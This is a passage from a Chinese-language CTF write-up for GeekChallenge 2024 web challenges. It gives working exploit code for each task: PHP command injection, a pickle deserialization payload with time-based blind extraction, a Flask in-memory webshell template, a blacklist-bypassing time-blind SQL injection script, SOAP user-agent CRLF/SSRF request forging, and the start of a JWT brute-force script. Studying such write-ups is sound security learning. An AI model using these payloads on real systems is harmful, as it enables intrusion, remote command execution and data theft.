</code></pre><p><img src="/img/WP/geek2024/phpjava1.png"><br>这次扫出了file<br>直接file -f &#x2F;flag<br><img src="/img/WP/geek2024/phpjava2.png"><br>P. S:<br>做完后发现change取implode能直接叫出toString<br>链子直接变成一段<br>甚至能不用Challenge类的吗，惊了。</p><h2 id="SecretInDrivingSchool"><a href="#SecretInDrivingSchool" class="headerlink" title="SecretInDrivingSchool"></a>SecretInDrivingSchool</h2><p>审计HTTP发现有注释<br>L000G1n.php<br>登录还有提示，出题人好温油<br>账号为4-16位数字或者英文字母<br>密码格式为三位字母+@chengxing<br>用admin: SYC@chengxing 登录成功，转到adChange.php<br><img src="/img/WP/geek2024/ad.png"><br>考虑。。注一下？<br>在广告代码最后写</p><pre><code>&lt;?= `cat /flag` ?&gt;
</code></pre><p>然后就能在首页看到flag啦~<br><img src="/img/WP/geek2024/showad.png"></p><h2 id="rce-me"><a href="#rce-me" class="headerlink" title="rce_me"></a>rce_me</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">header</span>(<span class="string">&quot;Content-type:text/html;charset=utf-8&quot;</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment"># Can you RCE me?</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (!<span class="title function_ invoke__">is_array</span>(<span class="variable">$_POST</span>[<span class="string">&quot;start&quot;</span>])) &#123;</span><br><span class="line">    <span class="keyword">if</span> (!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/start.*now/is&quot;</span>, <span class="variable">$_POST</span>[<span class="string">&quot;start&quot;</span>])) &#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="title function_ invoke__">strpos</span>(<span class="variable">$_POST</span>[<span class="string">&quot;start&quot;</span>], <span class="string">&quot;start now&quot;</span>) === <span class="literal">false</span>) &#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&quot;Well, you haven&#x27;t started.&lt;br&gt;&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;Welcome to GeekChallenge2024!&lt;br&gt;&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (</span><br><span class="line">    <span class="title function_ invoke__">sha1</span>((<span class="keyword">string</span>) <span class="variable">$_POST</span>[<span class="string">&quot;__2024.geekchallenge.ctf&quot;</span>]) == <span class="title function_ invoke__">md5</span>(<span class="string">&quot;Geekchallenge2024_bmKtL&quot;</span>) &amp;&amp;</span><br><span class="line">    (<span class="keyword">string</span>) <span class="variable">$_POST</span>[<span class="string">&quot;__2024.geekchallenge.ctf&quot;</span>] != <span class="string">&quot;Geekchallenge2024_bmKtL&quot;</span> &amp;&amp;</span><br><span class="line">    <span class="title function_ invoke__">is_numeric</span>(<span class="title function_ invoke__">intval</span>(<span class="variable">$_POST</span>[<span class="string">&quot;__2024.geekchallenge.ctf&quot;</span>]))</span><br><span class="line">) &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;You took the first step!&lt;br&gt;&quot;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">foreach</span> (<span class="variable">$_GET</span> <span class="keyword">as</span> <span class="variable">$key</span> =&gt; <span class="variable">$value</span>) &#123;</span><br><span class="line">        <span class="variable">$$key</span> = <span class="variable">$value</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">intval</span>(<span class="variable">$year</span>) &lt; <span class="number">2024</span> &amp;&amp; <span class="title function_ invoke__">intval</span>(<span class="variable">$year</span> + <span class="number">1</span>) &gt; <span class="number">2025</span>) &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;Well, I know the year is 2024&lt;br&gt;&quot;</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/.+?rce/ism&quot;</span>, <span class="variable">$purpose</span>)) &#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&quot;nonono&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (<span class="title function_ invoke__">stripos</span>(<span class="variable">$purpose</span>, <span class="string">&quot;rce&quot;</span>) === <span class="literal">false</span>) &#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&quot;nonononono&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;Get the flag now!&lt;br&gt;&quot;</span>;</span><br><span class="line">        <span class="keyword">eval</span>(<span class="variable">$GLOBALS</span>[<span class="string">&#x27;code&#x27;</span>]);</span><br><span class="line">        </span><br><span class="line">        </span><br><span class="line"></span><br><span class="line">        </span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;It is not enough to stop you!&lt;br&gt;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;It is so easy, do you know sha1 and md5?&lt;br&gt;&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">Well, you haven<span class="string">&#x27;t started.</span></span><br></pre></td></tr></table></figure><p>特性都很一般般，不详细讲了<br>大小写绕过，php7转化参数错误<br>我收藏的哈希函数绕过：<a href="https://blog.hatchet.top/posts/66a71aff">https://blog.hatchet.top/posts/66a71aff</a><br>对转换参数有疑问可以搭个php 自己 echo $_GET;<br>甚至还用了去年的题目。。。<br><img src="/img/WP/geek2024/ez_php.png"></p><h2 id="ez-python"><a href="#ez-python" class="headerlink" title="ez_python"></a>ez_python</h2><p>这题我在moectf2024写的pet_store的payload竟然能直接用上。。。<br>出题人过滤了bash不能反弹shell，又无回显怎么办？<br>我用的时间盲注</p><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line"><span class="comment"># 字符集 [A-Za-z0-9&#123;&#125;-_]</span></span><br><span class="line">alphabet = string.ascii_letters + string.digits + <span class="string">&quot;&#123;&#125;-_&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 目标 URL</span></span><br><span class="line">target_url = <span class="string">&quot;http://5000-97f7a701-0ac8-4d83-a520-41a98ed6f1bd.challenge.ctfplus.cn/login&quot;</span>  <span class="comment"># 替换为目标 URL</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 猜测 $FLAG 的最大长度</span></span><br><span class="line">max_flag_length = <span class="number">50</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">generate_payload</span>(<span class="params">prefix</span>):</span><br><span class="line">    <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    根据当前猜测的前缀生成 payload。</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line">    payload_code = <span class="string">f&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">import os;import time;</span></span><br><span class="line"><span class="string">result=os.popen(&#x27;cat /flag&#x27;).read();</span></span><br><span class="line"><span class="string">if result.startswith(&quot;<span class="subst">&#123;prefix&#125;</span>&quot;):</span></span><br><span class="line"><span class="string">    time.sleep(1)</span></span><br><span class="line"><span class="string">else:</span></span><br><span class="line"><span class="string">    time.sleep(0.1)</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">class</span> <span class="title class_">Pet</span>:</span><br><span class="line">        <span class="keyword">def</span> <span class="title function_">__reduce__</span>(<span class="params">self</span>):</span><br><span class="line">            <span class="keyword">return</span> (<span class="built_in">exec</span>, (payload_code,))</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 使用 pickle 序列化并编码为 base64</span></span><br><span class="line">    <span class="keyword">return</span> base64.b64encode(pickle.dumps(Pet())).decode()</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">send_payload</span>(<span class="params">payload</span>):</span><br><span class="line">    <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    发送 payload 并测量响应时间。</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line">    cookies = &#123;</span><br><span class="line">        <span class="string">&quot;heart&quot;</span>: <span class="string">&quot;a4a4c3ff70994e5ab8b7222ab9ab30289ff438e3557d8bf54357d20195459fd6&quot;</span></span><br><span class="line">    &#125;</span><br><span class="line">    data = &#123;<span class="string">&quot;statement&quot;</span>: payload&#125;</span><br><span class="line">    <span class="comment"># print(payload)</span></span><br><span class="line">    start_time = time.time()</span><br><span class="line">    <span class="comment"># 发送请求（假设是 POST 请求）</span></span><br><span class="line">    response = requests.post(target_url, data=data, cookies=cookies)</span><br><span class="line">    <span class="built_in">print</span>(response.text)</span><br><span class="line">    end_time = time.time()</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> end_time - start_time</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">guess_flag</span>():</span><br><span class="line">    <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    猜测 $FLAG 的值。</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line">    guessed_flag = <span class="string">&quot;&quot;</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(max_flag_length):</span><br><span class="line">        <span class="keyword">for</span> char <span class="keyword">in</span> alphabet:</span><br><span class="line">            current_guess = guessed_flag + char</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&quot;Testing: <span class="subst">&#123;current_guess&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line">            <span class="comment"># 生成 payload</span></span><br><span class="line">            payload = generate_payload(current_guess)</span><br><span class="line">            time.sleep(<span class="number">0.1</span>)</span><br><span class="line">            <span class="comment"># 测量响应时间</span></span><br><span class="line">            response_time = send_payload(payload)</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> response_time &gt; <span class="number">0.8</span>:</span><br><span class="line">                <span class="comment"># 如果响应时间大于阈值，则表示猜测正确</span></span><br><span class="line">                guessed_flag += char</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">f&quot;Found character: <span class="subst">&#123;char&#125;</span>&quot;</span>)</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="comment"># 如果遍历完整个字母表都没有找到字符，说明 FLAG 猜测完毕</span></span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&quot;FLAG guessed: <span class="subst">&#123;guessed_flag&#125;</span>&quot;</span>)</span><br><span class="line">            <span class="keyword">return</span> guessed_flag</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    flag = guess_flag()</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;Final FLAG: <span class="subst">&#123;flag&#125;</span>&quot;</span>)</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>写内存马也可以<br>内存马板子</p><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 内存马</span></span><br><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Pet</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__reduce__</span>(<span class="params">self</span>):</span><br><span class="line">        cmd_injection = <span class="string">&quot;__import__(&#x27;os&#x27;).popen(request.args.get(&#x27;cmd&#x27;)).read()&quot;</span></span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">eval</span>, (</span><br><span class="line">            <span class="string">&quot;__import__(&#x27;sys&#x27;).modules[&#x27;__main__&#x27;].__dict__[&#x27;app&#x27;]&quot;</span></span><br><span class="line">            <span class="string">&quot;.before_request_funcs.setdefault(None, []).append(lambda :&quot;</span></span><br><span class="line">            + cmd_injection</span><br><span class="line">            + <span class="string">&quot;)&quot;</span>,</span><br><span class="line">        )</span><br><span class="line"></span><br><span class="line"><span class="comment"># 创建类实例并序列化为pickle，再进行base64编码</span></span><br><span class="line">a = Pet()</span><br><span class="line">b = pickle.dumps(a)</span><br><span class="line"><span class="built_in">print</span>(base64.b64encode(b).decode())</span><br></pre></td></tr></table></figure><p>因为用一次就会爆500，所以用python读取。</p><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">cookies = &#123;<span class="string">&quot;heart&quot;</span>: <span class="string">&quot;a4a4c3ff70994e5ab8b7222ab9ab30289ff438e3557d8bf54357d20195459fd6&quot;</span>&#125;</span><br><span class="line">payload = <span class="string">&quot;gASVwgAAAAAAAACMCGJ1aWx0aW5zlIwEZXZhbJSTlIymX19pbXBvcnRfXygnc3lzJykubW9kdWxlc1snX19tYWluX18nXS5fX2RpY3RfX1snYXBwJ10uYmVmb3JlX3JlcXVlc3RfZnVuY3Muc2V0ZGVmYXVsdChOb25lLCBbXSkuYXBwZW5kKGxhbWJkYSA6X19pbXBvcnRfXygnb3MnKS5wb3BlbihyZXF1ZXN0LmFyZ3MuZ2V0KCdjbWQnKSkucmVhZCgpKZSFlFKULg==&quot;</span></span><br><span class="line">data = &#123;<span class="string">&quot;statement&quot;</span>: payload&#125;</span><br><span class="line">url = <span class="string">&quot;http://5000-61f7d735-0939-4825-97fd-785ea19574d4.challenge.ctfplus.cn/&quot;</span></span><br><span class="line">sess = requests.session()</span><br><span class="line">r = sess.post(url=url + <span class="string">&quot;login&quot;</span>, cookies=cookies, data=data)</span><br><span class="line"><span class="built_in">print</span>(r.text)</span><br><span class="line"></span><br><span class="line">r = sess.get(</span><br><span class="line">    url=url + <span class="string">&quot;cmd?cmd=cat /flag&quot;</span>,</span><br><span class="line">    cookies=cookies,</span><br><span class="line">)</span><br><span class="line"><span class="built_in">print</span>(r.text)</span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="funnySQL（复现）"><a href="#funnySQL（复现）" class="headerlink" title="funnySQL（复现）"></a>funnySQL（复现）</h2><p>黑名单：</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/and|or| |\n|--|sleep|=|ascii/i&#x27;</span>,<span class="variable">$str</span>))&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&#x27;不准用！&#x27;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>无回显，想到了时间盲注，sleep没了用benchmark。参考官方WP，这题不需要无列名，只有一列。</p><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">from</span> urllib.parse <span class="keyword">import</span> quote, unquote</span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;http://80-da8c321e-f040-42c1-8bef-b4b844370336.challenge.ctfplus.cn/?username=&quot;</span></span><br><span class="line">flag = <span class="string">&quot;&quot;</span></span><br><span class="line">chars = <span class="string">&quot;0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ!#&amp;&#x27;()*+,-./:;&lt;=&gt;?@[\]^`&#123;|&#125;~&quot;</span></span><br><span class="line">timeout_threshold = <span class="number">3</span>  <span class="comment"># 设置延时阈值，秒数</span></span><br><span class="line"></span><br><span class="line">payload0 = <span class="string">&quot;&#x27;||if(substr((select version()),&#123;&#125;,1)=binary &#x27;&#123;&#125;&#x27;,benchmark(1000000,md5(1)),0)#&quot;</span>  <span class="comment"># 10_2_26-MariaDB-log</span></span><br><span class="line">payload1 = <span class="string">&quot;&#x27;||if(substr((select group_concat(database())),&#123;&#125;,1)=binary &#x27;&#123;&#125;&#x27;,benchmark(1000000,md5(1)),0)#&quot;</span>  <span class="comment"># syclover</span></span><br><span class="line">payload2 = <span class="string">&quot;&#x27;||if((substr((select table_name from mysql.innodb_table_stats where database_name=&#x27;syclover&#x27; limit 0,1),&#123;&#125;,1)=binary &#x27;&#123;&#125;&#x27;),benchmark(10000000,sha1(1)),0)#&quot;</span>  <span class="comment"># Rea11ys3ccccccr3333t</span></span><br><span class="line"><span class="comment"># sys.schema_auto_increment_columns</span></span><br><span class="line"><span class="comment"># sys.schema_table_statistics_with_buffer</span></span><br><span class="line"><span class="comment"># sys.x$schema_table_statistics_with_buffer</span></span><br><span class="line"><span class="comment"># sys.x$schema_table_statistics</span></span><br><span class="line"><span class="comment"># sys.x$ps_schema_table_statistics_io</span></span><br><span class="line"><span class="comment"># mysql.innodb_table_stats</span></span><br><span class="line"><span class="comment"># mysql.innodb_index_stats</span></span><br><span class="line">payload3 = <span class="string">&quot;&#x27;||if(substr((select * from Rea11ys3ccccccr3333t),&#123;&#125;,1)=binary &#x27;&#123;&#125;&#x27;,benchmark(10000000,sha1(1)),0)#&quot;</span> <span class="comment"># </span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="number">100</span>):  <span class="comment"># 从1开始</span></span><br><span class="line">    found = <span class="literal">False</span></span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> chars:</span><br><span class="line">        payload = payload3.<span class="built_in">format</span>(i, j).replace(<span class="string">&quot;=&quot;</span>, <span class="string">&quot; like &quot;</span>).replace(<span class="string">&quot; &quot;</span>, <span class="string">&quot;\x09&quot;</span>)</span><br><span class="line">        full_url = url + quote(payload)</span><br><span class="line">        <span class="built_in">print</span>(full_url)</span><br><span class="line">        <span class="comment"># 记录请求开始时间</span></span><br><span class="line">        start_time = time.time()</span><br><span class="line"></span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            r = requests.get(url=full_url)</span><br><span class="line">        <span class="keyword">except</span> requests.RequestException <span class="keyword">as</span> e:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&quot;请求失败: <span class="subst">&#123;e&#125;</span>&quot;</span>)</span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line"></span><br><span class="line">        <span class="comment"># 检查是否触发防御</span></span><br><span class="line">        <span class="keyword">if</span> <span class="string">&quot;不准用&quot;</span> <span class="keyword">in</span> r.text:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;请求被阻止，退出。&quot;</span>)</span><br><span class="line">            exit(-<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">        <span class="comment"># 计算响应时间</span></span><br><span class="line">        response_time = time.time() - start_time</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;正在测试字符: <span class="subst">&#123;j&#125;</span>, 响应时间: <span class="subst">&#123;response_time:<span class="number">.2</span>f&#125;</span> 秒&quot;</span>)</span><br><span class="line"></span><br><span class="line">        <span class="comment"># 检查是否达到延时阈值</span></span><br><span class="line">        <span class="keyword">if</span> response_time &gt;= timeout_threshold:</span><br><span class="line">            flag += j</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&quot;找到字符: <span class="subst">&#123;j&#125;</span>, 当前 flag: <span class="subst">&#123;flag&#125;</span>&quot;</span>)</span><br><span class="line">            found = <span class="literal">True</span></span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> found:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;没有更多字符，退出。&quot;</span>)</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;最终 flag: <span class="subst">&#123;flag&#125;</span>&quot;</span>)</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>实测benchmark(1000000,md5(1))在payload0和payload1是能跑出结果，但在payload2就不行，而benchmark(10000000,sha1(1))就能跑所有的payload，吐了啊。。。</p><h2 id="ezSSRF（复现）"><a href="#ezSSRF（复现）" class="headerlink" title="ezSSRF（复现）"></a>ezSSRF（复现）</h2><p><strong><a target="_blank" rel="external nofollow noopener noreferrer" href="http://www.zip/">www.zip</a></strong>存在源码泄露<br>h4d333333.php</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;user&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$user</span>=<span class="string">&quot;stranger&quot;</span>;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="variable">$user</span>=<span class="variable">$_POST</span>[<span class="string">&#x27;user&#x27;</span>];</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;location&#x27;</span>])) &#123;</span><br><span class="line">    <span class="variable">$location</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;location&#x27;</span>];</span><br><span class="line">    <span class="variable">$client</span>=<span class="keyword">new</span> <span class="title class_">SoapClient</span>(<span class="literal">null</span>,<span class="keyword">array</span>(</span><br><span class="line">        <span class="string">&quot;location&quot;</span>=&gt;<span class="variable">$location</span>,</span><br><span class="line">        <span class="string">&quot;uri&quot;</span>=&gt;<span class="string">&quot;hahaha&quot;</span>,</span><br><span class="line">        <span class="string">&quot;login&quot;</span>=&gt;<span class="string">&quot;guest&quot;</span>,</span><br><span class="line">        <span class="string">&quot;password&quot;</span>=&gt;<span class="string">&quot;gueeeeest!!!!&quot;</span>,</span><br><span class="line">        <span class="string">&quot;user_agent&quot;</span>=&gt;<span class="variable">$user</span>.<span class="string">&quot;&#x27;s Chrome&quot;</span>));</span><br><span class="line"></span><br><span class="line">    <span class="variable">$client</span>-&gt;<span class="title function_ invoke__">calculator</span>();</span><br><span class="line"></span><br><span class="line">    <span class="keyword">echo</span> <span class="title function_ invoke__">file_get_contents</span>(<span class="string">&quot;result&quot;</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;Please give me a location&quot;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>calculator.php</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$admin</span>=<span class="string">&quot;aaaaaaaaaaaadmin&quot;</span>;</span><br><span class="line"><span class="variable">$adminpass</span>=<span class="string">&quot;i_want_to_getI00_inMyT3st&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">check</span>(<span class="params"><span class="variable">$auth</span></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">global</span> <span class="variable">$admin</span>,<span class="variable">$adminpass</span>;</span><br><span class="line">    <span class="variable">$auth</span> = <span class="title function_ invoke__">str_replace</span>(<span class="string">&#x27;Basic &#x27;</span>, <span class="string">&#x27;&#x27;</span>, <span class="variable">$auth</span>);</span><br><span class="line">    <span class="variable">$auth</span> = <span class="title function_ invoke__">base64_decode</span>(<span class="variable">$auth</span>);</span><br><span class="line">    <span class="keyword">list</span>(<span class="variable">$username</span>, <span class="variable">$password</span>) = <span class="title function_ invoke__">explode</span>(<span class="string">&#x27;:&#x27;</span>, <span class="variable">$auth</span>);</span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$username</span>.<span class="string">&quot;&lt;br&gt;&quot;</span>.<span class="variable">$password</span>;</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$username</span>===<span class="variable">$admin</span> &amp;&amp; <span class="variable">$password</span>===<span class="variable">$adminpass</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">2</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$_SERVER</span>[<span class="string">&#x27;REMOTE_ADDR&#x27;</span>]!==<span class="string">&quot;127.0.0.1&quot;</span>)&#123;</span><br><span class="line">    <span class="keyword">exit</span>(<span class="string">&quot;Hacker&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$expression</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;expression&#x27;</span>];</span><br><span class="line"><span class="variable">$auth</span>=<span class="variable">$_SERVER</span>[<span class="string">&#x27;HTTP_AUTHORIZATION&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$auth</span>))&#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">check</span>(<span class="variable">$auth</span>)===<span class="number">2</span>) &#123;</span><br><span class="line">        <span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/^[0-9+\-*\/]+$/&#x27;</span>, <span class="variable">$expression</span>)) &#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&quot;Invalid expression&quot;</span>);</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="variable">$result</span>=<span class="keyword">eval</span>(<span class="string">&quot;return <span class="subst">$expression</span>;&quot;</span>);</span><br><span class="line">            <span class="title function_ invoke__">file_put_contents</span>(<span class="string">&quot;result&quot;</span>,<span class="variable">$result</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="variable">$result</span>=<span class="keyword">eval</span>(<span class="string">&quot;return <span class="subst">$expression</span>;&quot;</span>);</span><br><span class="line">        <span class="title function_ invoke__">file_put_contents</span>(<span class="string">&quot;result&quot;</span>,<span class="variable">$result</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">exit</span>(<span class="string">&quot;Hacker&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>没想到被h4d333333.php中的echo file_get_contents(“result”);误导了，以为传ssrf会有回显，结果传完啥都没有就没尝试了。<br>其实直接读result文件就可以，echo file_get_contents当不存在就好<br>原理是soap传递时，UA如果可控。就可以伪造HTTP包进行SSRF和CRLF攻击。<br>自己写的soap UA伪造</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$location</span> = <span class="string">&quot;http://127.0.0.1/calculator.php&quot;</span>;</span><br><span class="line"><span class="variable">$data</span> = <span class="string">&quot;expression=system(&#x27;cat /flag&#x27;)&quot;</span>;</span><br><span class="line"><span class="variable">$headers</span> = <span class="keyword">array</span>(</span><br><span class="line">    <span class="string">&quot;Authorization: Basic YWFhYWFhYWFhYWFhZG1pbjppX3dhbnRfdG9fZ2V0STAwX2luTXlUM3N0&quot;</span>,</span><br><span class="line">);</span><br><span class="line"><span class="comment">#$user_agent = &quot;hatchet\r\nContent-Type: application/x-www-form-urlencoded\r\nContent-Length: &quot; . (string) strlen($data) . &quot;\r\n&quot;</span></span><br><span class="line"><span class="variable">$user_agent</span> = <span class="string">&quot;hatchet\r\n\r\n\r\n\r\n\r\nPOST /calculator.php HTTP/1.1\r\nHost: 127.0.0.1\r\nContent-Type: application/x-www-form-urlencoded\r\nContent-Length: &quot;</span> . (<span class="keyword">string</span>) <span class="title function_ invoke__">strlen</span>(<span class="variable">$data</span>) . <span class="string">&quot;\r\n&quot;</span></span><br><span class="line">    . <span class="title function_ invoke__">join</span>(<span class="string">&quot;\r\n&quot;</span>, <span class="variable">$headers</span>)</span><br><span class="line">    . <span class="string">&quot;\r\n\r\n&quot;</span> . <span class="variable">$data</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">urlencode</span>(<span class="variable">$user_agent</span>);</span><br></pre></td></tr></table></figure><p>真简单啊</p><h2 id="py-game（复现）"><a href="#py-game（复现）" class="headerlink" title="py_game（复现）"></a>py_game（复现）</h2><p>用flask-unsign可以预先跑一遍字典爆破secret_key（可以排除一些弱口令）</p><p>个人爆破jwt脚本</p><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> jwt</span><br><span class="line"></span><br><span class="line">token = <span class="string">&quot;eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJpc3MiOiJRaW5nd2FuIiwibmFtZSI6InVzZXIiLCJhZG1pbiI6ImZhbHNlIn0.gzCFCz2Hw5c_EIjcM2lQ2QL3aDW3rAAHU2ZQ50_tnY4&quot;</span>  <span class="comment"># 题目中的 token</span></span><br><span class="line">password_file = <span class="string">&quot;./crypto/wordlist.txt&quot;</span>  <span class="comment"># 枚举密码字典文件</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(password_file, <span class="string">&quot;rb&quot;</span>) <span class="keyword">as</span> file:</span><br><span class="line">    <span class="keyword">for</span> line <span class="keyword">in</span> file:</span><br><span class="line">        line = line.strip()  <span class="comment"># 去除每行后面的换行</span></span><br><span 